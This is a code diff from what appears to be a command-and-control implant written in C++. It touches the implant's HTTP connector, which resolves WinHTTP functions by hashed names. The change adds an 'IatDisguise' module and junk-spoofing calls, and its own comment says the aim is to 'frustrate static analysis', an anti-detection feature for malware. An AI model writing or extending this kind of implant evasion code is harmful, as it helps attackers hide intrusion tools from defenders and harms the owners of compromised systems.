@@ -8,6 +8,7 @@
 #include "utils.h"
 #include "Agent.h"
 #include "OpsecThread.h"
+#include "IatDisguise.h"
 
 extern Agent* g_Agent;
 
@@ -100,6 +101,10 @@ Connector* CreateConnectorHTTP()
 		data->functions->WinHttpAddRequestHeaders = (decltype(WinHttpAddRequestHeaders)*) GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPADDREQUESTHEADERS);
 		data->functions->WinHttpWriteData      = (decltype(WinHttpWriteData)*)       GetSymbolAddress(hWinhttp, HASH_FUNC_WINHTTPWRITEDATA);
 	}
+
+	// Disguise IAT entries to frustrate static analysis
+	IatDisguise_Init();
+	AX_SPOOF_CONNECTOR_JUNK();
 
 	conn->SetProfile = ConnectorHTTP_SetProfile;
 	conn->WaitForConnection = Connector_DefaultWaitForConnection;
